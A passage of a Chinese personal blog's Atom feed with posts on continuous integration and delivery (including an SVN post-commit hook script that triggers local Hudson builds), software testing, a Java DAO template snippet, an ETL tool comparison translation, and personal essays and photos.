持续集成一个很重要的内容就是需要很好的内建质量，软件工程中主要就是代码质量，提高代码质量的工具多种多样，比如可以利用构建中的代码检查工具，比如FindBugs, Similar Code etc.，来规范代码，发现不规范的代码，如果不通过工具检查，则最好构建失败。提高代码质量还有一种有效的方式就是代码审查，即CodeReview，通过开发者之间互相评审代码提高代码质量。因为可以看到变更集，具体到哪个开发人员提交了哪些代码，有些时候甚至可以让开发者对应的测试者也可以参与到CodeReview，这样有几个好处：
&lt;ol&gt;
	&lt;li&gt;让测试熟悉所测产品的业务代码，提升代码的阅读能力&lt;/li&gt;
	&lt;li&gt;提早发现代码里面的bug，低成本保障质量，防患于未然&lt;/li&gt;
	&lt;li&gt;提前预知并评估并确认测试范围，减少测试工作量&lt;/li&gt;
	&lt;li&gt;促进开发、测试间的沟通、交流和协作&lt;/li&gt;
&lt;/ol&gt;
具体实践中的工具可以用&lt;a title=&quot;ReviewBoard&quot; href=&quot;http://www.reviewboard.org/&quot; target=&quot;_blank&quot;&gt;ReviewBoard&lt;/a&gt;，在结合SVN的pre-commit hook，如果该次变更没有codereview过，则无法提交。 二. 自动构建   构建可以解决开发、测试、集成、验收等工作的混乱，同时本身也是一种最基本的测试。在没有采用构建之前，测试的组的工作状态是，每个人更新代码，然后编译在开发环境下面测试，有时候甚至跑不起来，不是开发人员忘记上传代码无法编译，就是测试人员编译过程有遗漏，而且每个人的测试版本都不一样，测试这边有问题，结果到开发那边又没有问题，不但麻烦，而且无法快速定位问题出在哪里。这种混乱导致大部分时间浪费在了沟通上，大量的郁闷。有一个形象的对话，可以见&lt;a title=&quot;构建的好处&quot; href=&quot;http://blog.csdn.net/program_think/article/details/3897080&quot; target=&quot;_blank&quot;&gt;这里&lt;/a&gt;。 自动构建主要包括编译，单元测试，生成二进制包等等，分为提交前开发者构建，和提交后在持续集成服务器中的构建，这边主要指后者。 最先了解构建这个概念，是从&lt;a title=&quot;观止&quot; href=&quot;http://book.douban.com/subject/3699395/&quot; target=&quot;_blank&quot;&gt;《观止-微软创建NT和未来的夺命狂奔》&lt;/a&gt;一书获得的，里面的大卫.卡特勒对构建十分重视，甚至分配专门的构建员，或亲自做构建。 &lt;a href=&quot;/uploads/2012/03/showstopper.jpg&quot;&gt;&lt;img class=&quot;aligncenter size-full wp-image-305&quot; title=&quot;showstopper&quot; src=&quot;/uploads/2012/03/showstopper.jpg&quot; alt=&quot;&quot; width=&quot;303&quot; height=&quot;438&quot; /&gt;&lt;/a&gt; 在构建这里介绍一个非常好用的持续集成工具：&lt;a title=&quot;Hudson&quot; href=&quot;http://hudson-ci.org/&quot; target=&quot;_blank&quot;&gt;Hudson&lt;/a&gt;。有很好的定时任务管理，可以配置各种脚本Ant, BAT等等，还可以与很多其他的工具结合的非常好，有很多好用的插件，比如&lt;a title=&quot;FishEye&quot; href=&quot;http://www.atlassian.com/software/fisheye/overview&quot; target=&quot;_blank&quot;&gt;FishEye&lt;/a&gt;，&lt;a title=&quot;SVN&quot; href=&quot;http://subversion.tigris.org/&quot; target=&quot;_blank&quot;&gt;SVN&lt;/a&gt;，邮件发送，FTP, FindBugs等等，是做自动化测试的利器。 构建包括编译和单元测试，如果是Java应用，编译就可以用Ant，单元测试可以用JUnit，TDD方面有一本很好的书：&lt;a title=&quot;测试驱动开发&quot; href=&quot;http://book.douban.com/subject/1230036/&quot; target=&quot;_blank&quot;&gt;《测试驱动开发》&lt;/a&gt; &lt;a href=&quot;/uploads/2012/03/tdd.jpg&quot;&gt;&lt;img class=&quot;aligncenter size-full wp-image-306&quot; title=&quot;tdd&quot; src=&quot;/uploads/2012/03/tdd.jpg&quot; alt=&quot;&quot; width=&quot;432&quot; height=&quot;544&quot; /&gt;&lt;/a&gt; 持续集成要求的构建是开发每次提交代码，都会触发构建，而不是一些软件公司常用的定时触发（比如每隔一个小时），如果构建失败会发送邮件给导致构建失败的相关人员，要求其立即修复；如果构建成功，则将构建结果发布到Alpha场所，供后续的测试、试用、验收工作使用。修复失败的构建是所有任务中优先级最高的。 对于如何做到每次提交代码触发构建，Hudson提供了一个很好的API：&lt;a title=&quot;Remote Access API&quot; href=&quot;http://wiki.hudson-ci.org/display/HUDSON/Remote+access+API&quot; target=&quot;_blank&quot;&gt;Hudson Remote Access API&lt;/a&gt;。我们可以利用这个API和SVN的post-commit hook结合，相关的脚本示例如下：

&lt;strong&gt;post-commit.bat&lt;/strong&gt;
&lt;pre escaped=&quot;true&quot; lang=&quot;bat&quot; line=&quot;1&quot;&gt;SET REPOS=%1
SET REV=%2
SET CSCRIPT=C:\WINDOWS\system32\cscript.exe
SET VBSCRIPT=E:\Document\hooks\post-commit-hook-hudson.vbs
SET SVNLOOK=D:\opt\Subversion\bin\svnlook.exe
SET HUDSON=http://127.0.0.1/hudson/job/code%E6%9E%84%E5%BB%BA%E5%92%8C%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95/
&quot;%CSCRIPT%&quot; &quot;%VBSCRIPT%&quot; &quot;%REPOS%&quot; %REV% &quot;%SVNLOOK%&quot; &quot;%HUDSON%&quot;&lt;/pre&gt;
&lt;strong&gt;post-commit-hook-hudson.vbs&lt;/strong&gt;
&lt;pre escaped=&quot;true&quot; lang=&quot;vb&quot; line=&quot;1&quot;&gt;repos   = WScript.Arguments.Item(0)
rev     = WScript.Arguments.Item(1)
svnlook = WScript.Arguments.Item(2)
hudson  = WScript.Arguments.Item(3)

Set shell = WScript.CreateObject(&quot;WScript.Shell&quot;)

Set uuidExec = shell.Exec(svnlook &amp;amp; &quot; uuid &quot; &amp;amp; repos)
Do Until uuidExec.StdOut.AtEndOfStream
  uuid = uuidExec.StdOut.ReadLine()
Loop
Wscript.Echo &quot;uuid=&quot; &amp;amp; uuid

Set changedExec = shell.Exec(svnlook &amp;amp; &quot; changed --revision &quot; &amp;amp; rev &amp;amp; &quot; &quot; &amp;amp; repos)
Do Until changedExec.StdOut.AtEndOfStream
  changed = changed + changedExec.StdOut.ReadLine() + Chr(10)
Loop
Wscript.Echo &quot;changed=&quot; &amp;amp; changed

change=CStr(changed)
a=InStr(change,&quot;trunk/code/&quot;) 

url = &quot;http://127.0.0.1/hudson/job/code%E6%9E%84%E5%BB%BA%E5%92%8C%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95/build?token=testanddevelop&quot;
Wscript.Echo url

if a&amp;gt;0 then
Set http = CreateObject(&quot;Microsoft.XMLHTTP&quot;)
http.open &quot;POST&quot;, url, False
http.setRequestHeader &quot;Content-Type&quot;,&quot;text/plain;charset=UTF-8&quot;
http.send changed
set http = nothing
end if
set repos = nothing
set rev =nothing
set svnlook = nothing
set hudson = nothing
set shell = nothing
set uuidExec = nothing
set changeExec = nothing
set change = nothing
set a = nothing
set url = nothing&lt;/pre&gt;
&lt;strong&gt;
&lt;/strong&gt;

更多的关于构建的知识，推荐这个系列文章: &lt;a title=&quot;软件工程进阶之每日构建&quot; href=&quot;http://blog.csdn.net/program_think/article/details/3897073&quot; target=&quot;_blank&quot;&gt;软件工程进阶之每日构建&lt;/a&gt; (&lt;a title=&quot;墙外&quot; href=&quot;http://program-think.blogspot.com/2009/02/daily-build-0-overview.html&quot; target=&quot;_blank&quot;&gt;墙外&lt;/a&gt;)。

三. Alpha场所

Alpha场所是一个地方，里面有一堆东西，常见的包括Alpha安装包，构建后的产物，Alpha应用等等。所有的这些东西都有一个共同的愿景：
&lt;strong&gt;就是降低测试和升级Jar包的难度，一直降低，直到：公司的任何一个人(甚至客户)，只要愿意，都可以方便的进行试用，测试和验收等工作，就像使用测试一个网站那样方便。&lt;/strong&gt;
一般来说，Alpha场所里面的东西是经过构建，或冒烟测试后所得的产物，但这个Alpha的愿景更多的表示，公司内部可以非常方便的获取这些构建结果，以达到及时响应，快速反馈的目的。比如Alpha安装包基本上相当于一个普通的安装包和一个方便的Update工具，而Alpha Web应用就更方便了，每次构建成功后都会自动推送热部署到Tomcat下的该应用，任何人只需打开浏览器访问该应用，都能获得最新的功能体验。

四. 冒烟测试

冒烟测试是收到构建成功后放到Alpha场所的二进制包，在其他测试验收活动开始之前进行的简单测试，只包括最基本的功能，一般每天早上过来跑一次，因此叫做每日冒烟测试。

为什么要有冒烟测试？ 我可以举一个没有冒烟测试之前的例子。有一段时间，开发组经常进行大规模的代码重构，并且导致很多基础的功能用不了，并且因此更多的依赖这些基础功能的测试工作也无法开展，按照持续集成的指导原则来说，越早的集成和测试越好，但是这样测试工作一下子就被阻滞了。原先想的办法是，提交紧急BUG，让开发优先修复，但后来发现根本不起作用，因为紧急只空留一个名义上的紧急，但实际处理的时候，可能还是要好几天才会得到处理。后来通过将那些最影响其他测试工作的项，组织成冒烟测试条目，并约定：&lt;strong&gt;如果冒烟测试失败，需要当天立刻修复，每一测试项都会对应有一个开发人员&lt;/strong&gt;。
</content>
 </entry>
 
 <entry>
   <title>测试思考系列[1]：往持续交付的方向努力</title>
   <link href="http://hackfisher.github.com/blog/2012/03/thinking-in-test-ci"/>
   <updated>2012-03-19T00:00:00+08:00</updated>
   <id>http://hackfisher.github.com/blog/2012/03/thinking-in-test-ci</id>
   <content type="html">测试应该朝什么方向努力，怎样做才能避免陷入泥潭? 产品不稳定的原因，粗略看上去，似乎是因为测试时间不够，测试不充分导致的，但是深入进去探讨会发现没有那么简单。这一篇文章就是探讨测试应该朝着什么目标去努力，而我在这半年的实践中选择的是持续交付的方向，下面就介绍介绍持续交付。

首先，如果测试不能从产品周期的一开始就参与进去，后期等产品快发布前再测试，会面临很大的问题。工作量大不谈，如果发现了BUG，开发的修复时间也不够了，更不要说可能产生严重的架构问题，或者功能和需求不符问题。

其次，现在很多软件公司所面临的问题，就是“铁路警察，各管一段”的问题，推诿职责，测试并不是银弹，不能解决全部问题，所以很大程度上需要责任共担。但这个东西是说起来容易做起来难的一件事情，当一个问题，你无法快速定位导致它的真正原因的时候，就无从谈起问责。想要做到快速定位，将定位问题原因的难度降低，一个很重要的原因是快速反馈，功能越早的被测试，问题就越容易被发现，也越容易被修复。做到这一点，主要就是靠持续集成，而持续集成就是持续交付的主要组成部分，原来听的比较多的也是“持续交付”，而持续交付的提出，更多的是为了解决所谓的“最后一公里”的问题，因为很多的BUG或者问题，需要延迟到用户真实的生产环境中去才能发现。很多做法，比如Alpha应用等等，都是往这个方面做得努力，就是不但要尽早的得到产品，还要尽早的部署。

再三，&lt;a title=&quot;测试思考系列[0]：概述&quot; href=&quot;http://www.hackfisher.info/blog/2012/03/thinking-in-test-summary/&quot; target=&quot;_blank&quot;&gt;上面一篇文章&lt;/a&gt;中提到的反馈影响图，也要求反馈的循环速度越快，换个意思表达，也就是持续的得到反馈，而只有真正集成或者交付后，才能得到有用的反馈。

持续交付的概念，我最早是从&lt;a title=&quot;InfoQ&quot; href=&quot;http://www.infoq.com/cn/&quot; target=&quot;_blank&quot;&gt;InfoQ&lt;/a&gt;上的一篇演讲学习到的，在这之前其实我只了解过持续集成。这个演讲(包括视频和PPT)的题目是&lt;a title=&quot;让持续交付成为可能&quot; href=&quot;http://www.infoq.com/cn/presentations/ql-continous-delivery-devops#.Tq_3r-g3trs.gmail&quot; target=&quot;_blank&quot;&gt;让持续交付成为可能&lt;/a&gt;，不仅探讨了概念，还通过真实案例分享，与听众一起回顾某产品团队如何从传统开发走向持续交付。讨论在产品交付中如何应用DevOps原则（协作、自动化、度量和信息共享），达到快速且可靠地发布高质量的软件，同时描述过程中遇到的难题及解决方案，并进一步探讨持续交付的意义。 很幸运看到这个演讲，开启了我的持续交付实践之路，在这里要感谢作者，带给我很多灵感和指导方向。(当时立马将这个演讲分享给团队成员，附带一句：“看了这个视频并且理解了的家伙，不谢我绝对没人性”)

关于持续交付，还有一本不得不介绍的好书，&lt;a title=&quot;《持续交付》&quot; href=&quot;http://book.douban.com/subject/6862062/&quot; target=&quot;_blank&quot;&gt;《持续交付》&lt;/a&gt;，配置管理，部署流水线等十分有用的概念，都是从这本书获得的，强烈推荐。

&lt;a href=&quot;/uploads/2012/03/devops.jpg&quot;&gt;&lt;img class=&quot;aligncenter size-full wp-image-294&quot; title=&quot;devops&quot; src=&quot;/uploads/2012/03/devops.jpg&quot; alt=&quot;&quot; width=&quot;324&quot; height=&quot;408&quot; /&gt;&lt;/a&gt;

持续交付是什么样的？
&lt;ul&gt;
	&lt;li&gt;软件的发布过程必须是可重复、可信赖的&lt;/li&gt;
	&lt;li&gt;把几乎所有的环节都做成自动化&lt;/li&gt;
	&lt;li&gt;把所有的内容都纳入版本控制&lt;/li&gt;
	&lt;li&gt;让痛苦提前，并不断练习&lt;/li&gt;
	&lt;li&gt;内建质量&lt;/li&gt;
	&lt;li&gt;“完成”就意味着“已发布”&lt;/li&gt;
	&lt;li&gt;所有人对交付负责&lt;/li&gt;
	&lt;li&gt;持续改进，需要耐心&lt;/li&gt;
&lt;/ul&gt;
持续集成借鉴了敏捷思想，打破了用户、开发和测试之间的隔阂，实现了团队的协作。而最近出现的DevOps则借鉴了敏捷思想，将敏捷原则应用于运维领域，使交付团队与运维团队建立起更紧密的合作关系。所以这里如果只介绍持续交付，而不介绍敏捷思想就过意不去了。

2001年2月11日到13日，17位软件开发领域的领军人物聚集在美国犹他州的滑雪胜地雪鸟（Snowbird）雪场。经过两天的讨论，“敏捷”（Agile）这个词为全体聚会者所接受，用以概括一套全新的软件开发价值观。这套价值观，通过一份简明扼要的&lt;a title=&quot;敏捷宣言&quot; href=&quot;http://agilemanifesto.org/iso/zhchs/&quot; target=&quot;_blank&quot;&gt;《敏捷宣言》&lt;/a&gt;，传递给世界，宣告了敏捷开发运动的开始。
&lt;p style=&quot;text-align: center;&quot;&gt;&lt;strong&gt;敏捷软件开发宣言&lt;/strong&gt;&lt;/p&gt;
&lt;p style=&quot;text-align: center;&quot;&gt;我们一直在实践中探寻更好的软件开发方法，
身体力行的同时也帮助他人。由此我们建立了如下价值观：&lt;/p&gt;
&lt;p style=&quot;text-align: center;&quot;&gt;&lt;strong&gt;个体和互动&lt;/strong&gt; 高于 流程和工具
&lt;strong&gt;工作的软件&lt;/strong&gt; 高于 详尽的文档
&lt;strong&gt;客户合作&lt;/strong&gt; 高于 合同谈判
&lt;strong&gt;响应变化&lt;/strong&gt; 高于 遵循计划&lt;/p&gt;
&lt;p style=&quot;text-align: center;&quot;&gt;也就是说，尽管右项有其价值，
我们更重视左项的价值。&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>梅花山·南京，三月十七号二零一二</title>
   <link href="http://hackfisher.github.com/blog/2012/03/plum-blossom-hill"/>
   <updated>2012-03-19T00:00:00+08:00</updated>
   <id>http://hackfisher.github.com/blog/2012/03/plum-blossom-hill</id>
   <content type="html">&lt;a href=&quot;/uploads/2012/03/red.png&quot;&gt;&lt;img class=&quot;aligncenter size-full wp-image-326&quot; title=&quot;red&quot; src=&quot;/uploads/2012/03/red.png&quot; alt=&quot;&quot; width=&quot;991&quot; height=&quot;502&quot; /&gt;&lt;/a&gt;

&lt;a href=&quot;/uploads/2012/03/white.png&quot;&gt;&lt;img class=&quot;aligncenter size-large wp-image-327&quot; title=&quot;white&quot; src=&quot;/uploads/2012/03/white-1024x811.png&quot; alt=&quot;&quot; width=&quot;1024&quot; height=&quot;811&quot; /&gt;&lt;/a&gt;

&lt;a href=&quot;/uploads/2012/03/tree.png&quot;&gt;&lt;img class=&quot;aligncenter size-full wp-image-328&quot; title=&quot;tree&quot; src=&quot;/uploads/2012/03/tree.png&quot; alt=&quot;&quot; width=&quot;814&quot; height=&quot;864&quot; /&gt;&lt;/a&gt;
</content>
 </entry>
 
 <entry>
   <title>思考测试系列[0]: 概述</title>
   <link href="http://hackfisher.github.com/blog/2012/03/thinking-in-test-summary"/>
   <updated>2012-03-12T00:00:00+08:00</updated>
   <id>http://hackfisher.github.com/blog/2012/03/thinking-in-test-summary</id>
   <content type="html">从去年七月份开始做测试到现在，做了很多探索，实践，和思考，公司的新产品刚刚发布，是机会该将这段实践对测试的思考整理一下了，为未来的测试工作做好更深入的准备。

在我理解，测试是一种非常具有挑战性的工作，并且非常需要创造性。

测试之难，难在没有成功的经典可以学习，不像其他领域，数学，音乐，科学都有很深的积累，测试有的是太多失败的案例，太多不稳定的产品。测试之难，还在于这是一份吃力不讨好的活，对于测试从业人员来说，同样付出了80%的努力，不像其他的职业基本上都能得到用户超过80%的肯定和赞许，而测试会因为那20%的疏漏，获得用户80%的质疑，用户会因为觉得把他们当做小白鼠而愤恨，将所有责任怪罪于测试人员，尤其国内更加如此，国外可能好些，对于软件开发不理解的人会期望像木匠打造一个桌子那样要求开发者。孰知，木匠打造桌子已经有了几千年的经验积累。正是因为这个后面的原因，所以又太多稍微聪敏的人都不愿意从事测试这个行业，而这个地方又是如此的重要和需要他们。

人们迫切需要软件来解决他们的问题，实现未来的梦想，但在现实生活中，软件却又是最不可靠的一种产品。我晚上刚刚接到我姐姐的电话求助我， 因为她开机刚刚遇到了一个ShowStopper， &quot;STOP:C0000218 Unknown Hard Error“，而我因为不在她身边，无法帮助她，但甚至连跟她解释这是什么错误都很困难，因为硬盘错误这个概念对他来说太难理解了。

软件对我们的未来至关重要，但目前软件的故障率已达到了触目惊心的程度。测试在软件质量中扮演者重要的发现和反馈角色，反馈为何会如此重要，请看看《测试驱动开发》中最后一章的反馈影像图吧，反馈速度越快越好，问题发现的越早，修复的成本越低。

&lt;a href=&quot;/uploads/2012/03/feedback.png&quot;&gt;&lt;img class=&quot;aligncenter size-full wp-image-284&quot; title=&quot;feedback&quot; src=&quot;/uploads/2012/03/feedback.png&quot; alt=&quot;&quot; width=&quot;426&quot; height=&quot;284&quot; /&gt;&lt;/a&gt;

开发和测试的关系，我中有你，你中有我，反馈环
&lt;a href=&quot;/uploads/2012/03/dev_test.png&quot;&gt;&lt;img class=&quot;aligncenter size-full wp-image-285&quot; title=&quot;dev_test&quot; src=&quot;/uploads/2012/03/dev_test.png&quot; alt=&quot;&quot; width=&quot;802&quot; height=&quot;488&quot; /&gt;&lt;/a&gt;

本系列的内容就是对测试做的一些思考而整理下来的内容，为了方便阅读，我将本系列的帖子整理如下：
1、 &lt;a title=&quot;测试思考系列[1]：往持续交付的方向努力&quot; href=&quot;http://www.hackfisher.info/测试/2012/03/thinking-in-test-ci/&quot; target=&quot;_blank&quot;&gt;往持续交付的方向努力&lt;/a&gt;
2、 &lt;a title=&quot;测试思考系列[2]：提交测试&quot; href=&quot;http://www.hackfisher.info/blog/2012/03/thinking-in-test-commit-test/&quot; target=&quot;_blank&quot;&gt;提交测试&lt;/a&gt;
3、 &lt;a title=&quot;测试思考系列[3]：回归测试&quot; href=&quot;http://www.hackfisher.info/blog/2012/03/thinking-in-test-regression-test/&quot; target=&quot;_blank&quot;&gt;回归测试&lt;/a&gt;
4、 &lt;a title=&quot;测试思考系列[4]：测试自动化&quot; href=&quot;http://www.hackfisher.info/blog/2012/03/thinking-in-test-automatization/&quot; target=&quot;_blank&quot;&gt;测试自动化&lt;/a&gt;
5、 &lt;a title=&quot;测试思考系列[5]：非功能性测试&quot; href=&quot;http://hackfisher.info/blog/2012/04/thinking-in-test-non-functional-testing/&quot; target=&quot;_blank&quot;&gt;非功能性测试&lt;/a&gt;
6、 &lt;a title=&quot;测试思考系列[5]：非功能性测试&quot; href=&quot;http://hackfisher.info/blog/2012/04/thinking-in-test-environment-and-config-automation/&quot; target=&quot;_blank&quot;&gt;测试环境和配置管理自动化&lt;/a&gt;
7、 探索式软件测试
8、 测试作为服务
9、 漫谈测试管理
</content>
 </entry>
 
 <entry>
   <title>上海, Saturday, November 26,2011</title>
   <link href="http://hackfisher.github.com/blog/2011/12/shanghai20111126"/>
   <updated>2011-12-03T00:00:00+08:00</updated>
   <id>http://hackfisher.github.com/blog/2011/12/shanghai20111126</id>
   <content type="html">&lt;p&gt;&lt;img src=&quot;/uploads/2011/12/bridge.jpg&quot; alt=&quot;bridge&quot; /&gt;
&lt;img src=&quot;/uploads/2011/12/cat.jpg&quot; alt=&quot;cat&quot; /&gt;
&lt;img src=&quot;/uploads/2011/12/cn.jpg&quot; alt=&quot;cn&quot; /&gt;
&lt;img src=&quot;/uploads/2011/12/leaf.jpg&quot; alt=&quot;leaf&quot; /&gt;
&lt;img src=&quot;/uploads/2011/12/river.jpg&quot; alt=&quot;river&quot; /&gt;
&lt;img src=&quot;/uploads/2011/12/sky.jpg&quot; alt=&quot;sky&quot; /&gt;
&lt;img src=&quot;/uploads/2011/12/star.jpg&quot; alt=&quot;star&quot; /&gt;
&lt;img src=&quot;/uploads/2011/12/sunset.jpg&quot; alt=&quot;sunset&quot; /&gt;
&lt;img src=&quot;/uploads/2011/12/tower.jpg&quot; alt=&quot;tower&quot; /&gt;&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Code Snippet 模板模式</title>
   <link href="http://hackfisher.github.com/blog/2011/11/codesnippet"/>
   <updated>2011-11-20T00:00:00+08:00</updated>
   <id>http://hackfisher.github.com/blog/2011/11/codesnippet</id>
   <content type="html">&lt;pre escaped=&quot;true&quot; lang=&quot;java&quot; line=&quot;1&quot;&gt;// DAOTemplate.java:
public static execute(Action action) {
DAOSession session = null;
try {
     session = createSession();
     session.beginTransaction();
     action.execute(session);
} catch (Exception e) {
     rollbackSession(session);
     throw e;
} finally {
     closeSession(session);
}
}

// invoke:
DAOTemplate.execute(new Action() {
   public execute(Session session) {
      // may invoke super.deleteByID(id, session);
      reportletEntryDAO.deleteByID(id, session); 
   }
});&lt;/pre&gt;
</content>
 </entry>
 
 <entry>
   <title>乡土履痕</title>
   <link href="http://hackfisher.github.com/blog/2011/10/lost-land"/>
   <updated>2011-10-31T00:00:00+08:00</updated>
   <id>http://hackfisher.github.com/blog/2011/10/lost-land</id>
   <content type="html">小时候在家，父母基本上不让我干活，就是宁可让我看电视玩电脑，也不让我干活。道理很简单，他们这辈子过的太辛苦，绝对不想让我再重复他们走过的老路了。但是最近回家，虽然也会偷懒，但是或多或少，都会帮忙干一些农活。不仅因为长大的原因，还是因为最近渐渐意识到一点，我对小时候长大的这片土地其实是非常陌生的，对这片土地上发生的事的越来越陌生，所以想熟悉熟悉那些我过去未曾打算了解的东西。

我大学毕业那会儿考虑过回家乡发展，也真正在家乡的银行实习了几个月。但是我发现在家时无法完全摆脱父母对我的影响。并且与大城市不同，家乡更多的是依靠现存的熟人和关系，至少在当时，我不喜欢这样，所以我离开了，又回到了大城市。

父母以前最担心的事情是，等他们老了，这些地可怎么办？家里这么多房子可怎么办？子女都在外面，怎么办？最近倒是不用担心了，社会的变迁远远超出了他们当时想象，就像在中国大地上其他地区发生的一样，家乡苏中农村正在经历也许是历史上最大规模的拆迁，人为的政府组织的推进城市化，带有明显的计划痕迹。而我对这一切环境则是显得越来越陌生，同时意味着我再也回不到过去的童年和少年，在我的记忆里，这段时间的记忆除了学校，其他都是美好的。

对于拆迁，父母的态度是复杂犹豫的，也很有意思。一方面，他们对于土地和房子空闲的担忧是没有了，另一方面，他们后悔当初把房子造的太结实了，这个房子建筑构造是我父亲亲手设计，他们一手建造的。我家旁边有条不小的河，为了防止下大雨时河边的泥土流失塌陷影响房子地基，父亲觉得不是长久之计，就用好几块结实的楼板作为坝挡在了河边。在他们的设想中，这个房子是按照一两百年来设计的，就算是给他们孙子的孙子来住也没有问题。现在要拆迁，他们自然舍不得。

同为老乡的挚友对我说了一句话：“人一旦离开的土地，就特别的怀念它。”

说这句话的时候，他家已经被拆迁，而我们正站在他拆迁后的新家窗户旁，离着地面十几米远，看着远处的刚建的工厂和整得不成样子的国道。当他正在说话的时候，我心里还在祈祷那些工厂的环境污染千万不要把这鱼米和丝绸之乡搞得千疮百孔，感天谢地。我的父母何尝不是这样，农民最怀念的还不是生活了一辈子的土地，这种深深的依赖突然失去的感觉就是一种落空感，像是失恋一样。可是在强大的国家机器面前，农民的这些情感又能占到几分重量，甚至都不会被人记起，最终会落进历史的尘埃，然后不知不觉得被打扫的一干二净。
</content>
 </entry>
 
 <entry>
   <title>收养了一只小猫</title>
   <link href="http://hackfisher.github.com/blog/2011/08/little-cat"/>
   <updated>2011-08-21T00:00:00+08:00</updated>
   <id>http://hackfisher.github.com/blog/2011/08/little-cat</id>
   <content type="html">上周末逛街时，一直跟在我们后面，于是就收养了它，这只猫很喜欢跟人呆在一起。

&lt;a href=&quot;/uploads/2011/08/cat.jpg&quot;&gt;&lt;img class=&quot;aligncenter size-large wp-image-252&quot; title=&quot;cat&quot; src=&quot;/uploads/2011/08/cat-768x1024.jpg&quot; alt=&quot;&quot; width=&quot;768&quot; height=&quot;1024&quot; /&gt;&lt;/a&gt;
</content>
 </entry>
 
 <entry>
   <title>开源ETL工具和商业ETL工具比较(译文)</title>
   <link href="http://hackfisher.github.com/blog/2011/07/open-source-etl-compare-commencial-etl-tool-translate"/>
   <updated>2011-07-07T00:00:00+08:00</updated>
   <id>http://hackfisher.github.com/blog/2011/07/open-source-etl-compare-commencial-etl-tool-translate</id>
   <content type="html">因为我对开源ETL工具也不太了解，正好最近再做这方面的研究，发现了这篇文章概括的还蛮仔细，就翻译过来了，能对现有的开源ETL工具有个初步了解。因为文章好像是08年的，可能已经过时了，以为已经过去快3年了，世事发展变化很快。

——————————————

——————————————
&lt;h2&gt;开源ETL工具和商业ETL工具比较&lt;/h2&gt;
作者：jonathanlevin

译者：Yangtsefisher

原文地址：&lt;a href=&quot;http://www.jonathanlevin.co.uk/2008/03/open-source-etl-tools-vs-commerical-etl.html&quot;&gt;http://www.jonathanlevin.co.uk/2008/03/open-source-etl-tools-vs-commerical-etl.html&lt;/a&gt;

发表日期：2008年

最近，公司要求我用一个开源ETL工具来代替商业的数据整合工具，&lt;a href=&quot;http://www.informatica.com/Pages/index.aspx&quot; target=&quot;_blank&quot;&gt;Informatica PowerCente&lt;/a&gt;r的案例。所以我尽我最大的努力，做了很多研究，并且假设我既没有用过开源工具，也没有用过商业工具。

我找到了很多 Pentaho Kettle 和 Talend之间比较的信息，这是我本来打算研究的两个开源工具。现在，我打算简短的比较一下它们的优劣。声明一下，这些比较是基于我在网上的研究，而非我使用这些工具的经验(事实上，我也没有用过)。
&lt;h2&gt;Pentaho Kettle vs Talend&lt;/h2&gt;
&lt;strong&gt;Pentaho&lt;/strong&gt;

Pentaho是一个商业开源的BI套件，有一个数据整合的产品叫做Kettle。

它创新的采用了元驱动的方法，并且拥有一个很强和很好用的GUI。

这个公司开始于2001年(2002左右Kettle被整合进去)。

它有一个13，500注册用户的强大社区。

它有一个独立的Java引擎来运行处理不同数据库和文件之间数据转换的作业和任务。

它可以调度任务(需要一个像cron的调度器)。

它可以运行部署在其他机器上“slave servers”的远程任务。

它拥有数据质量特征: 在它的GUI上，可以写自定义的SQL查询，JavaScript，和正则表达式。

&lt;strong&gt;Talend&lt;/strong&gt;

Talend是一个开源的数据整合工具(不是BI套件)。

它使用代码生成的方法。有一个GUI，但是在Eclipse RC里面。

它开始于2006年10月。

它有一个比Pentaho小得多的社区，但是有两个金融公司支持。

它生成可以在你服务器上运行的Java和Perl代码。

它可以调度任务(需要一个像cron的调度器)。

数据质量特征：界面上可以写自定义的SQL查询和Java。

&lt;strong&gt;比较&lt;/strong&gt;- (就我的理解)

Pentaho比Talend更快(两倍也许)。

Pentaho的GUI比Talend的GUI更容易，所以可以花更少的时间学习。

&lt;strong&gt;印象&lt;/strong&gt;

Pentaho的GUI更易用一些。

Talend更像是给那些已经用Java写程序的人，希望可以通过一个工具自动给他们生成代码，从而节省很多时间。

&lt;em&gt;假设Pentaho 晋级下一轮...&lt;/em&gt;
&lt;h2&gt;Pentaho Kettle vs Informatica&lt;/h2&gt;
&lt;strong&gt;Informatica&lt;/strong&gt;

Informatica是一个非常优秀的数据整合商业套件。

成立于1993年。

它是分享市场的领导者(Gartner 数据来源)。

它有2600多个客户。其中有财富100强，道琼斯上市公司和政府部门。

公司的核心业务就是数据整合。

它用一个非常大的包，整合进企业的系统，清洗他们的数据，并且可以连接到相当多当前的和传统的系统。

它非常贵，需要对你的雇员进行培训后才能使用，甚至有时需要请咨询(听说Informatica的咨询顾问薪资很高)。

它非常的快，并且可以适应大规模的系统。它有一个采用了ELT方法的&quot;&lt;a href=&quot;http://www.informatica.com/products/powercenter/options/pushdown/default.htm&quot; target=&quot;_blank&quot;&gt;下推优化&lt;/a&gt;&quot;，使用数据库来做转化操作，比如Oracle仓库构建。

&lt;strong&gt;比较&lt;/strong&gt;

Pentaho的Javascipt在写数据整合任务的时候非常强大。

Informatica有很多的企业级特性，比如数据库之间的负载均衡。

Pentaho的界面相较于Informatica来说需要的培训要少很多。

Penatho不需要像Informatica那样大的前期投入。

Informatica比Pentaho更快。Informatica有下推优化，但是如果对Pentaho做一些调整，并且有更多对数据库的了解，你可以改进Pentaho的速度。

你可以在许多不同的服务器上部署Pentaho(只要你愿意，免费的)，把它当作一个个集群。

Informatic比Pentaho有好的多的监控工具。

&lt;strong&gt;印象&lt;/strong&gt;

Infomatica真的是一个非常好的企业级ETL套件，但是非常大且昂贵。

如果你的系统足够小，我更愿意尝试Pentaho，并且有很多大公司使用Pentaho的案例(一个机场，一个医院)。

&lt;strong&gt;结论&lt;/strong&gt;

我觉得&lt;a href=&quot;http://www.ibridge.be/&quot; target=&quot;_blank&quot;&gt;matt casters&lt;/a&gt;有一句话说的好：

开源软件的潮流正在慢慢冲走专有软件的空间。

&amp;nbsp;

如果你想补充(或更正)我在这里写的内容，就尽管做吧，因为我自己仍然在试图理解这些产品。

你的观点是有价值的。

&amp;nbsp;

谢谢阅读。

&amp;nbsp;
</content>
 </entry>
 
 <entry>
   <title>JDK1.4下面如何实现Java Source动态编译及其应用</title>
   <link href="http://hackfisher.github.com/blog/2011/07/java-dynamic-compilation"/>
   <updated>2011-07-07T00:00:00+08:00</updated>
